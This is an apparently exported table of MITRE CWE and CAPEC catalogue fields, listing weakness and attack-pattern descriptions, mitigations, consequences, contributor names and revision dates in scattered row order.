22117	35	MITRE
8038	51	2014-06-23
18583	21	CWE Content Team
13247	46	A cross-domain policy file ("crossdomain.xml" in Flash and "clientaccesspolicy.xml" in Silverlight) defines a whitelist of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.             Therefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.             An overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.             In many cases, the attack can be launched without the victim even being aware of it.
23692	91	Implementation
10123	62	updated Common_Consequences
18167	86	http://blogs.sans.org/appsecstreetfighter/2010/03/04/top-25-series-rank-5-improper-access-control-authorization/
13290	46	This typically occurs when a pointer or its index is decremented to a position before the buffer; when pointer arithmetic results in a position before the buffer; or when a negative index is used, which generates a position before the buffer.
18292	60	03
21267	35	MITRE
16555	62	updated Applicable_Platforms, Common_Consequences, Time_of_Introduction
12506	71	2006
20739	67	Low
13641	39	2008-09-08
9584	39	2008-09-08
5790	79	Integrity
13588	35	MITRE
7696	79	Confidentiality
17124	28	Eric Dalci
12666	56	ChildOf
12255	62	updated Relationships
22009	104	95
24694	62	updated Relationships
22785	28	CWE Content Team
19819	28	CWE Content Team
24320	31	1000
18218	43	Simple
12571	88	Improper Handling of Undefined Parameters
21904	35	MITRE
18374	39	2008-07-01
7662	39	2010-12-13
15194	35	MITRE
15318	100	The MITRE Corporation
13727	28	Eric Dalci
11938	86	https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
6414	62	updated Potential_Mitigations
8555	25	Medium
24538	27	CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch
11858	57	Indirect
19844	43	Simple
13034	77	Fuzzing
15500	91	Requirements
23523	56	CanPrecede
20863	21	CLASP
15311	81	Confidentiality
17646	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
18270	26	Architecture and Design
21312	62	updated Applicable_Platforms
24427	40	One or more API functions exposed by the target host has a buffer overflow vulnerability.
14343	21	CWE Content Team
6626	39	2014-07-30
10509	62	updated Relationships
19033	51	2014-06-23
9369	28	CWE Content Team
23132	35	MITRE
11192	28	CWE Content Team
7205	56	ChildOf
7360	35	Veracode
20341	39	2008-09-08
17397	62	updated Demonstrative_Examples
13763	26	Implementation
8136	73	Use a browser to manually explore the website and analyze how the application processes XML requests.
20735	28	CWE Content Team
21964	33	Ivan Krsul
18637	60	11
12199	63	DoS: Resource Consumption (CPU)
19720	39	2011-06-01
9391	63	Read Application Data
25150	25	High
19717	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
11292	100	The MITRE Corporation
16849	28	Eric Dalci
15408	35	MITRE
19234	39	2015-12-07
17998	39	2009-05-27
11796	67	High
17224	35	MITRE
9923	102	ChildOf
15284	39	2010-02-16
20823	21	PLOVER
20178	81	Access Control
23517	56	ChildOf
23207	28	CWE Content Team
24626	62	updated Common_Consequences
14145	95	[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.
17409	96	2018-07-02
8557	28	CWE Content Team
18611	28	CWE Content Team
18712	101	CAPEC Content Team
15045	23	An adversary uses stolen Kerberos tickets to access systems that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.
19380	35	MITRE
17426	28	CWE Content Team
14874	85	37
22916	63	Execute Unauthorized Code or Commands
16891	62	updated Relationships, Taxonomy_Mappings
13511	28	CWE Content Team
6869	91	Operation
11775	39	2012-10-30
14599	49	2015
14519	95	[Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.
11280	79	Availability
24123	39	2011-09-13
20077	62	updated Time_of_Introduction
20788	62	updated Demonstrative_Examples
7612	89	Detailed
16173	51	2018-04-12
7063	102	ChildOf
7526	77	Dynamic Analysis with Manual Results Interpretation
9198	62	updated Relationships, Taxonomy_Mappings
18325	101	CAPEC Content Team
11995	31	1000
20006	35	MITRE
16654	91	Implementation
17100	40	An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.
15111	39	2011-06-01
18361	35	MITRE
15348	62	updated Potential_Mitigations, Time_of_Introduction
20312	28	CWE Content Team
19571	35	MITRE
23888	47	Read Data
7525	54	Medium
17174	47	Alter Execution Logic
16325	62	updated Relationships, Taxonomy_Mappings
8600	63	Other
9287	91	Implementation
14288	46	It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.
18280	28	CWE Content Team
6394	104	5
22426	39	2012-05-11
7793	62	updated Related_Attack_Patterns, Relationships
8410	26	Implementation
13690	69	Incomplete
15037	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
22871	35	MITRE
18344	62	updated Time_of_Introduction
9103	69	Incomplete
11088	28	CWE Content Team
19797	49	2009
16020	35	MITRE
21408	35	MITRE
8879	80	Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.
24180	50	For security reasons, a UTF-8 decoder must not accept UTF-8 sequences that are longer than necessary to encode a character. If you use a parser to decode the UTF-8 encoding, make sure that parser filter the invalid UTF-8 characters (invalid forms or overlong forms).
5966	72	System resources, CPU and memory, can be quickly consumed. This can lead to poor system performance or system crash.
19273	50	Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.
17027	62	updated Related_Attack_Patterns
16748	74	1
20459	40	The destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policy
15675	35	MITRE
20076	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
16377	69	Incomplete
11879	91	Implementation
11067	24	MITRE
15936	62	updated Description, Relationships, Observed_Example, Other_Notes, Weakness_Ordinalities
15274	35	MITRE
24682	61	Draft
24348	28	Eric Dalci
19592	35	MITRE
10217	26	Implementation
7945	28	CWE Content Team
11733	59	Updated Attacker_Skills_or_Knowledge_Required
5881	39	2019-06-20
15562	38	If the first decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.
16624	78	Low
10286	80	The adversary needs to know certain linux commands for this type of attack.
20697	63	Read Application Data
6510	86	https://www.securecoding.cert.org/confluence/display/seccode/EXP00-C.+Use+parentheses+for+precedence+of+operation
6208	56	ChildOf
15537	39	2017-11-08
21075	91	Implementation
18782	84	20
21037	67	High
12170	35	MITRE
17803	85	94
6258	95	[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)
9575	39	2012-05-11
22821	30	Arik Friedman
7832	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
11741	28	CWE Content Team
11414	72	An attacker could gain access to and modify sensitive data or system information.
25344	39	2019-06-20
12356	103	Primary
22930	39	2014-07-30
15608	66	Top 25 Series - Rank 23 - Open Redirect
9866	21	CLASP
21319	39	2012-05-11
18362	100	The MITRE Corporation
8134	39	2008-09-08
13722	39	2011-06-01
23628	43	Simple
10269	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
14961	63	DoS: Crash, Exit, or Restart
18495	57	Primary
15492	35	MITRE
13734	62	updated Common_Consequences
19987	56	ChildOf
21523	94	A successful attack of this kind can compromise the confidentiality of an authorized user's credentials.
22772	23	Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.
25293	40	The adversary is able to modify resource.
8463	62	updated Demonstrative_Examples, Relationships
6595	28	CWE Content Team
24983	39	2012-05-11
23883	39	2011-06-01
19696	81	Other
10111	23	An adversary modifies a technology, product, or component during its development to acheive a negative impact once the system is deployed. The goal of the adversary is to modify the system in such a way that the negative impact can be leveraged when the system is later deployed. Development alteration attacks may include attacks that insert malicious logic into the system's software, modify or replace hardware components, and other attacks which negatively impact the system during development. These attacks generally require insider access to modify source code or to tamper with hardware components. The product is then delivered to the user where the negative impact can be leveraged at a later time.
12118	81	Access Control
15941	63	DoS: Resource Consumption (Memory)
6716	62	updated Demonstrative_Examples, Description
24647	39	2012-10-30
15166	31	699
7650	101	CAPEC Content Team
16949	31	709
19624	79	Access Control
23720	47	Modify Data
6338	101	CAPEC Content Team
12075	63	Quality Degradation
5887	62	updated Related_Attack_Patterns
19305	28	Eric Dalci
12098	28	CWE Content Team
11118	66	Format String Vulnerabilities in Perl Programs
23275	62	updated Relationships
8742	56	ChildOf
8163	55	CAPEC Content Team
19979	62	updated Relationships
11134	57	Indirect
6382	103	Primary
14879	39	2010-06-21
17763	39	2011-03-29
5793	42	Encapsulate the user from interacting with data sentinels. Validate user input to verify that sentinels are not present.
15552	35	MITRE
12627	53	The MITRE Corporation
9837	86	http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf
7620	39	2014-07-30
14645	73	The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.
24505	103	Primary
15196	61	Draft
22564	28	Eric Dalci
9710	79	Confidentiality
20129	62	updated Relationships, Taxonomy_Mappings
21037	90	C++
13333	76	2017-08-04
22747	78	Low
5802	69	Draft
17086	62	updated Relationships
17326	23	The product does not prevent the definition of control spheres from external actors.
22510	62	updated Observed_Examples, References, Relationships
7228	103	Primary
22805	28	CWE Content Team
19880	63	Execute Unauthorized Code or Commands
9228	43	Simple
22112	54	High
20813	33	Jason Lam
25368	73	Brute force attack through black box penetration test tool.
19065	59	Updated References
16935	47	Gain Privileges
22278	35	Cigital
16705	63	Read Application Data
14727	35	MITRE
20108	62	updated Demonstrative_Examples, Observed_Examples, Relationships
17208	69	Draft
19084	59	Updated Resources_Required
17247	31	1000
15655	28	CWE Content Team
12786	95	[Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.
9550	28	CWE Content Team
11150	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
25017	28	CWE Content Team
10884	39	2017-11-08
17507	28	CWE Content Team
18179	63	Read Memory
5804	31	699
19476	39	2011-06-01
14730	100	The MITRE Corporation
21922	92	Exploit
19887	35	MITRE
6029	92	Explore
17462	62	updated Relationships
19175	62	updated Description, Name, Observed_Examples
20919	27	A tool capable of sending and receiving packets from a remote system.
17525	73	Use a proxy tool to record results of the created requests.
17316	26	Implementation
13002	28	CWE Content Team
18668	35	MITRE
22298	76	2018-07-31
12275	26	Implementation
12249	28	CWE Content Team
12160	89	Detailed
7165	39	2014-07-30
11462	31	1000
15851	62	updated Relationships, Taxonomy_Mappings
7146	56	ChildOf
8407	46	When software allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.             Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.
21450	39	2011-06-01
10924	35	MITRE
9456	35	MITRE
21400	39	2009-03-10
5910	35	MITRE
11857	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
7330	42	Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in your configuration of the Struts Validator. Example uses of the validator include checking to ensure that:                                                                  Phone number fields contain only valid characters in phone numbers                         Boolean values are only "T" or "F"                         Free-form strings are of a reasonable length and composition
24526	39	2015-12-07
16492	56	ChildOf
13217	62	updated Relationships, Taxonomy_Mappings
9490	35	Cigital
13344	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
24892	39	2009-07-27
16791	28	CWE Content Team
9695	35	MITRE
10236	59	Updated Related_Weaknesses
20180	35	MITRE
19152	50	Minimize error/response output to only what is necessary for functional use or corrective language.
8895	21	Landwehr
17157	81	Other
18914	56	ChildOf
21044	72	When a race condition allows multiple control flows to access a resource simultaneously, it might lead the program(s) into unexpected states, possibly resulting in a crash.
21518	28	CWE Content Team
7856	51	2015-11-09
18788	23	An adversary intercepts traffic and intentionally drops DNS requests based on content in the request. In this way, the adversary can deny the availability of specific services or content to the user even if the IP address is changed.
19738	39	2019-01-03
10713	63	Varies by Context
21372	74	1
15380	77	Automated Dynamic Analysis
19861	39	2019-06-20
12289	40	The attacker must be able to place the malicious binary on the target machine.
6252	63	Varies by Context
24752	21	PLOVER
19921	62	updated Common_Consequences
14432	39	2015-12-07
21629	62	updated Demonstrative_Examples, Relationships
12964	39	2011-03-29
11796	45	Class
23254	49	2006
5847	35	MITRE
21926	91	Architecture and Design
23626	86	http://www.owasp.org/index.php/Top_10_2007-A7
17509	35	Cigital
18446	51	2014-06-23
16227	23	A software system that accepts input in the form of a backslash absolute path ('\absolute\pathname\here') without appropriate validation can allow an attacker to traverse the file system to unintended locations or access arbitrary files.
16732	62	updated Time_of_Introduction
12670	88	Struts: Duplicate Validation Forms
21238	85	178
10093	39	2017-11-08
15665	35	KDM Analytics
13145	79	Integrity
19632	28	CWE Content Team
9576	61	Draft
10406	79	Access Control
10216	104	151
7030	100	The MITRE Corporation
14847	28	CWE Content Team
19333	100	The MITRE Corporation
24686	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
17080	72	Trust may be assigned to an entity who is not who it claims to be.
16665	91	Architecture and Design
11501	21	Evgeny Lebanidze
12065	104	178
21646	67	High
7095	35	MITRE
8412	35	MITRE
13630	39	2009-10-29
9570	39	2014-07-30
14620	33	Oliver Lavery
9994	62	updated Common_Consequences
6624	59	Updated Attack_Phases
7359	55	CAPEC Content Team
15459	47	Hide Activities
11531	81	Authorization
23201	97	Cloning Magnetic Strip Cards
6183	35	MITRE
23160	39	2008-09-08
14618	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
12526	76	2018-07-31
21462	101	CAPEC Content Team
9068	53	The MITRE Corporation
22993	91	Implementation
19860	88	Missing Default Case in Switch Statement
12664	63	Varies by Context
22979	73	Execute features that are not intended to be used by general system users.
11212	90	Language-Independent
8565	35	MITRE
16792	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
17769	70	Extracting Service Account Passwords with Kerberoasting
22810	62	updated Potential_Mitigations
21065	63	Alter Execution Logic
6306	25	Medium
12556	39	2012-05-11
24034	28	CWE Content Team
21762	35	MITRE
9808	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
6165	45	Variant
5809	35	MITRE
19731	55	Seamus Tuohy
14898	28	CWE Content Team
15517	35	MITRE
11822	76	2017-08-04
7328	62	updated Common_Consequences
16411	35	MITRE
19789	86	http://blogs.sans.org/appsecstreetfighter/2010/03/05/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/
15045	61	Stable
18898	73	Use a proxy tool to record results of manual input of XSS probes in known URLs.
19325	39	2008-09-08
11084	49	2007
6471	50	The client software should not install untrusted code from a non-authenticated server.
6174	78	Medium
5904	39	2008-07-01
12090	31	1000
10084	104	456
16561	90	C
17847	42	Do not use Java I/O when writing EJBs.
18604	28	CWE Content Team
22515	35	MITRE
13116	51	2014-06-23
21199	49	2001
11506	60	06
5773	21	CWE Content Team
7713	104	613
16585	96	2008-01-30
21259	23	True random number generators (TRNG) generally have a limited source of entropy and therefore can fail or block.
8017	103	Primary
20539	53	The MITRE Corporation
6813	57	Indirect
6953	21	CWE Content Team
6506	28	CWE Content Team
12386	28	CWE Content Team
21207	101	CAPEC Content Team
16120	39	2017-11-08
6080	62	updated Potential_Mitigations, References
15801	62	updated Potential_Mitigations
18549	103	Primary
21246	31	1000
7906	35	MITRE
15063	70	The Art of Port Scanning
15040	28	CWE Content Team
15035	35	MITRE
11897	40	The adversary must have access to modify files that the target software will consume.
11444	77	Manual Dynamic Analysis
19731	51	2017-01-03
14883	35	Cigital
8805	36	http://en.wikipedia.org/wiki/Disassembler
18852	92	Explore
12157	28	CWE Content Team
8875	28	CWE Content Team
13142	62	updated Relationships, Taxonomy_Mappings
16953	28	CWE Content Team
5802	23	The software uses a function that accepts a format string as an argument, but the format string originates from an external source.
13075	62	updated Relationships
20607	96	2018-07-02
16405	28	CWE Content Team
5928	95	[Identify services] Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.
22853	39	2011-03-29
23818	23	An adversary uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow the adversary to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP, but as more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed.
15718	62	updated Relationships
8389	35	MITRE
21271	28	CWE Content Team
20670	39	2017-11-08
9457	89	Detailed
25364	28	CWE Content Team
15805	35	MITRE
18350	23	The software defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.
16821	45	Variant
8968	91	Implementation
22411	62	updated Common_Consequences
12737	62	updated Detection_Factors, References, Relationships
11118	86	http://www.securityfocus.com/archive/1/418460/30/0/threaded
17055	90	Language-Independent
9257	92	Exploit
24851	28	Eric Dalci
13820	56	ChildOf
19581	31	699
17083	76	2018-07-31
17397	28	CWE Content Team
13737	35	MITRE
9777	62	updated Relationships
21372	73	Optionally obtain a legitimate SSL certificate for the new domain name.
17130	91	Implementation
15165	63	Read Application Data
24898	39	2009-03-10
11760	62	updated Common_Consequences
21031	21	CWE Content Team
20172	28	CWE Content Team
23551	62	updated References, Taxonomy_Mappings
9446	28	CWE Content Team
20420	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
8120	39	2008-08-01
10813	28	CWE Content Team
10853	31	699
20812	62	updated Relationships, Other_Notes
8093	35	MITRE
16851	35	MITRE
5769	35	MITRE
7181	35	MITRE
21730	62	updated Common_Consequences
9345	35	MITRE
19874	90	C
23306	26	Architecture and Design
6317	35	MITRE
6375	62	updated Common_Consequences
8936	35	MITRE
16850	86	http://ha.ckers.org/xss.html
13631	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships
18612	69	Draft
17543	62	updated Potential_Mitigations
8026	24	MITRE
20177	54	High
15148	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
25000	103	Primary
12920	104	843
5981	74	2
7336	35	MITRE
9384	39	2017-05-03
10098	28	CWE Content Team
7877	28	CWE Content Team
25278	23	The software checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the software to perform invalid actions when the resource is in an unexpected state.
6958	39	2008-09-08
9245	28	CWE Content Team
18842	92	Exploit
15846	77	Automated Static Analysis - Source Code
21351	59	Updated Related_Attack_Patterns
24868	103	Primary
15843	28	CWE Content Team
12642	63	DoS: Crash, Exit, or Restart
8715	49	2012
7690	54	Medium
14393	62	updated Time_of_Introduction
6144	23	This tries to cover various problems in which improper data are included within a "container."
11162	62	updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Potential_Mitigations, Relationships
24300	73	Obtain username(s) by sniffing network packets.
7865	35	MITRE
9064	30	Robin Cover, ed.
20610	100	The MITRE Corporation
17425	55	CAPEC Content Team
25065	39	2009-07-27
15517	62	updated Common_Consequences
16386	72	An attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.
8236	62	updated Relationships, Taxonomy_Mappings
17934	102	ChildOf
12656	39	2014-07-30
13407	51	2014-06-23
18433	56	ChildOf
6949	59	Updated Related_Weaknesses
24149	39	2013-02-21
21426	39	2009-05-27
19249	36	http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS
13062	62	updated Potential_Mitigations, References, Relationships
24613	89	Detailed
14858	28	CWE Content Team
8145	104	543
20142	39	2008-07-01
8801	59	Updated Resources_Required
15225	39	2017-11-08
16543	90	C++
13883	54	Low
8775	39	2010-02-16
22835	28	CWE Content Team
20554	35	MITRE
12629	50	The only known mitigation to this attack is to avoid installing the malicious application on the device. Applications usually have to declare the schemes they wish to register, so detecting this during a review is feasible.
17525	95	[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.
22142	78	Low
17997	62	updated Potential_Mitigations, Time_of_Introduction
21778	69	Incomplete
14591	104	839
16991	63	Bypass Protection Mechanism
23971	39	2014-06-23
9530	63	Other
9978	35	MITRE
8246	62	updated Related_Attack_Patterns
25115	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
8919	76	2019-04-04
16042	45	Variant
17579	45	Variant
9692	76	2015-11-09
16624	54	Medium
24635	91	Implementation
8679	62	updated Common_Consequences
7660	86	http://www.cs.ucdavis.edu/research/tech-reports/1995/CSE-95-9.pdf
16529	91	Implementation
11987	69	Incomplete
14203	39	2019-06-20
21316	56	ChildOf
21603	28	CWE Content Team
8229	92	Experiment
16777	91	Architecture and Design
15769	62	updated Common_Consequences, Demonstrative_Examples
12114	92	Experiment
13433	62	updated Relationships
9482	59	Updated Related_Attack_Patterns
15329	39	2013-02-21
9731	56	ChildOf
19471	91	Implementation
21258	28	CWE Content Team
14832	23	An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.
15717	95	[Craft a malicious website]The attacker crafts a malicious website to which he plans to lure the victim who is using the vulnerable target system. The malicious website does two things:                                                                  1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest).                         2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker.                                                            This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.
15139	97	Authentication Bypass
17642	39	2011-06-27
11607	28	CWE Content Team
13495	76	2015-12-07
10481	100	The MITRE Corporation
22712	51	2014-06-23
20942	32	Raytheon
19510	62	updated Relationships
9808	28	CWE Content Team
13225	28	CWE Content Team
16444	35	MITRE
13023	88	Improper Authorization in Handler for Custom URL Scheme
16979	24	MITRE
10003	95	The attacker leverages the exploit to execute arbitrary code or to cause a denial of service.
17860	62	updated Demonstrative_Examples, Detection_Factors, Relationships
12331	39	2017-11-08
7823	81	Other
10497	39	2010-09-27
17324	62	updated Relationships
7759	103	Primary
14546	103	Primary
10319	39	2011-06-01
22629	31	699
14462	21	Anonymous Tool Vendor (under NDA)
24629	39	2010-12-13
6730	35	MITRE
13135	102	ChildOf
16771	23	A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.
21427	96	2018-07-02
18813	81	Availability
17339	39	2019-01-03
10381	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
11772	31	1000
6460	59	Updated Related_Attack_Patterns
20265	39	2009-10-29
18687	28	CWE Content Team
11269	56	ChildOf
20983	89	Detailed
7219	39	2017-11-08
5623	35	MITRE
22024	28	CWE Content Team
9821	49	2008
14096	39	2008-09-08
17827	72	Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. Besides important user data, heap-based overflows can be used to overwrite function pointers that may be living in memory, pointing it to the attacker's code. Even in applications that do not explicitly use function pointers, the run-time will usually leave many in memory. For example, object methods in C++ are generally implemented using function pointers. Even in C programs, there is often a global offset table used by the underlying runtime.
20153	25	Medium
13458	28	CWE Content Team
8272	84	28
5962	63	Modify Files or Directories
5790	94	Run Arbitrary Code
21959	26	Architecture and Design
13027	35	MITRE
6124	39	2014-06-23
24508	28	CWE Content Team
16258	59	Updated Resources_Required
23820	35	MITRE
11934	42	Break up privileges between different modules, objects or entities. Minimize the interfaces between modules and require strong access control between them.
6821	81	Other
22956	62	updated Common_Consequences, Description, Name, References, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
12629	85	505
23564	81	Integrity
7952	35	MITRE
15234	28	CWE Content Team
18833	53	The MITRE Corporation
11435	35	MITRE
10150	103	Primary
8345	23	An attacker with access to a manufacturer's hardware manufacturing process documentation alters the design specifications, which introduces flaws advantageous to the attacker once the system is deployed.
6724	62	updated Relationships
9197	28	CWE Content Team
18383	103	Primary
19812	28	Eric Dalci
12574	39	2010-09-27
12663	62	updated Maintenance_Notes, Other_Notes, Terminology_Notes
19046	28	CWE Content Team
10408	26	Operation
8386	91	Implementation
9628	35	MITRE
6730	39	2014-07-30
17793	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
10144	97	Redirect Access to Libraries
15676	63	Execute Unauthorized Code or Commands
8192	100	The MITRE Corporation
18313	62	updated Related_Attack_Patterns
23764	28	CWE Content Team
15026	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator. [REF-45]
7683	100	The MITRE Corporation
8942	61	Draft
12341	62	updated Applicable_Platforms, Demonstrative_Examples, Description
15909	79	Confidentiality
24706	63	DoS: Crash, Exit, or Restart
25183	35	MITRE
15460	89	Detailed
22271	28	CWE Content Team
15312	53	The MITRE Corporation
15082	62	updated Common_Consequences
16567	62	updated Relationships, Taxonomy_Mappings
13652	39	2012-10-30
5641	39	2010-06-21
11023	35	MITRE
13776	62	updated Potential_Mitigations, Time_of_Introduction
10111	97	Development Alteration
13559	53	The MITRE Corporation
18404	77	Automated Static Analysis - Source Code
18700	35	MITRE
16159	21	CLASP
12577	101	CAPEC Content Team
23841	91	Implementation
11405	28	CWE Content Team
20196	35	MITRE
18933	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
13426	104	499
25051	39	2017-01-19
13286	39	2012-10-30
13996	62	updated Common_Consequences, Observed_Examples, Potential_Mitigations, Relationships, Weakness_Ordinalities
18821	45	Base
13022	39	2013-07-17
